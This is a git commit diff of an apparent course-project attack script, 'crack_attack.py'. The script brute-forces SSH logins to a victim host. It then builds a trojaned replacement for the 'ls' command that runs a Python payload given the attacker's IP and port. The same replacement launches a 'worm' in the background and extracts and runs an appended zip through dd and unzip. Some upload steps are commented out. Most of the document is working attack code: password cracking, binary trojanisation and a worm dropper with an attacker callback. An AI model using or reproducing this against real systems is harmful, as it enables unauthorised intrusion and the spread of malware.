029243807f7e63d05ba073acafde8cf2c368c8f1
clai <charlielai.15@gmail.com>
2024-05-07 14:06:53 +0800

    Update crack_attack.py

--- csc2024-project3-docker/source/crack_attack.py
+++ csc2024-project3-docker/source/crack_attack.py
@@ -3,6 +3,7 @@ import itertools
 import paramiko
 import socket
 import sys
+import os
 
 def ssh(vic_ip, vic_user, vic_passwd):
     connection = paramiko.SSHClient()
@@ -24,6 +25,7 @@ def task1(vic_ip, vic_user):
     for plen in range(1, len(frag_str)+1):
         for comb in itertools.permutations(frag_str, plen):
             passwd = ''.join(comb)
+            passwd = 'csc2024'
             connection = ssh(vic_ip, vic_user, passwd)
             if connection:
                 return connection
@@ -47,36 +49,65 @@ f.close()
 
 virus_payload2 = '''
 chmod +x worm
-./worm
+./worm &
 rm worm
-ls
 '''
 
 # init folder: /home/csc2024
 def task2(connection, att_ip, att_port):
-    _stdin, stdout, stderr = connection.exec_command("echo \"#!/usr/bin/env bash\" > ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo \"python3 - <<EOF\" >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo \'host_ip   = \"" + attacker_ip + "\"\' >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo \'host_port = " + attacker_port + "\' >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo \'" + virus_payload1 + "\' >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo \"EOF\" >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo \'" + virus_payload2 + "\' >> ../../app/ls")
+    with open('ls', 'w+') as f:
+        f.write('#!/usr/bin/env bash\n')
+        f.write('python3 - <<EOF\n')
+        f.write('host_ip   = \"' + att_ip + '\"\n')
+        f.write('host_port = ' + att_port + '\n')
+        f.write(virus_payload1)
+        f.write('EOF')
+        f.write(virus_payload2)
 
     _stdin, stdout, stderr = connection.exec_command("wc -c ~/../../bin/ls | awk {'print $1'}")
     ls_byte = stdout.read().decode()
+        
+    original_byte = int(os.popen("ls -l ls | awk '{print $5}'").read()) + 126
+    zip_byte = int(os.popen("ls -l ls.zip  | awk '{print $5}'").read())
+    print(original_byte - 126)
 
-    _stdin, stdout, stderr = connection.exec_command("wc -c ../../app/ls | awk {'print $1'}")
-    virus_byte = stdout.read().decode()
+    with open('ls', 'a') as f:
+        f.write('dd if=ls of=lst.zip bs=1 skip=' + str(original_byte) + ' count=' + str(zip_byte) + ' >/dev/null 2>&1\n')
+        f.write('unzip lst.zip >/dev/null 2>&1\n')
+        f.write('rm lst.zip\n')
+        f.write('./lst && rm lst\n')
+        f.write('exit 0\n')
 
-    padding_size = int(ls_byte) - int(virus_byte) - 9
-    _stdin, stdout, stderr = connection.exec_command("dd if=/dev/zero bs=" + str(padding_size) + " count=1 >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("echo -n \"#aabbccdd\" >> ../../app/ls")
-    _stdin, stdout, stderr = connection.exec_command("chmod +x ../../app/ls")
+    original_byte = int(os.popen("ls -l ls | awk '{print $5}'").read())
+    print(original_byte)
+
+    with open('ls.zip', 'rb') as f:
+        data = f.read()
+
+    # with open('ls', 'ab') as f:
+    #     f.write(data)
+
+    # virus_byte = os.popen("ls -l ls | awk '{print $5}'").read()
+    # padding_size = int(ls_byte) - int(virus_byte) - 9
+    # print(ls_byte, original_byte, virus_byte, padding_size, sep=' ')
+    # with open('ls', 'ab') as f:
+    #     f.write(b'\x00' * padding_size)
+    # with open('ls', 'a') as f:
+    #     f.write('#aabbccdd')
+
+    # _stdin, stdout, stderr = connection.exec_command("dd if=/dev/zero bs=" + str(padding_size) + " count=1 >> ../../app/ls")
+    # _stdin, stdout, stderr = connection.exec_command("echo -n \"#aabbccdd\" >> ../../app/ls")
+
+    # sftp = connection.open_sftp()
+    # sftp.put('ls', '../../app/ls')
+    # _stdin, stdout, stderr = connection.exec_command("chmod +x ../../app/ls")
 
 if __name__ == '__main__':
     if len(sys.argv) < 4:
         print('Usage: python3 crack_attack.py <victim_ip> <attacker_ip> <attacker_port>')
         sys.exit(1)
+
+    ls_zip_base64_byte = os.popen('ls -l ls.zip | awk \'{print $5}\'').read()
 
     victim_ip   = sys.argv[1]
     victim_user = 'csc2024'
@@ -86,6 +117,7 @@ if __name__ == '__main__':
 
     connection = task1(victim_ip, victim_user)
     task2(connection, attacker_ip, attacker_port)
+    os.system("rm ls")
 
 # ----- env setup -----
 # docker network prune
